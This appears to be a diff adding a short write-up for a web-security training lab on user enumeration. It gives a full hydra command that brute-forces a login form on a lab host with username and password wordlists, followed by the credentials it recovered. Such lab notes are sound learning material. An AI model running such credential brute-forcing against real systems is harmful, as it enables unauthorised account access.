@@ -1,0 +1,11 @@
+User enumeration via different responses
+
+Goal:
+- Enumerate a valid username and password to access the application.
+
+Attack:
+-------
+sudo hydra -L /home/kali/Identification-and-Authentication-Failures/lab01/usernames.txt -P /home/kali/Identification-and-Authentication-Failures/lab01/passwords.txt -u -f -I "0ad700ce0478bbcc817f5cd0006200d5.web-security-academy.net" https-post-form "/login:username=^USER^&password=^PASS^&Login=Login:Log in" -o results.txt
+
+Username: as
+Password: 123123
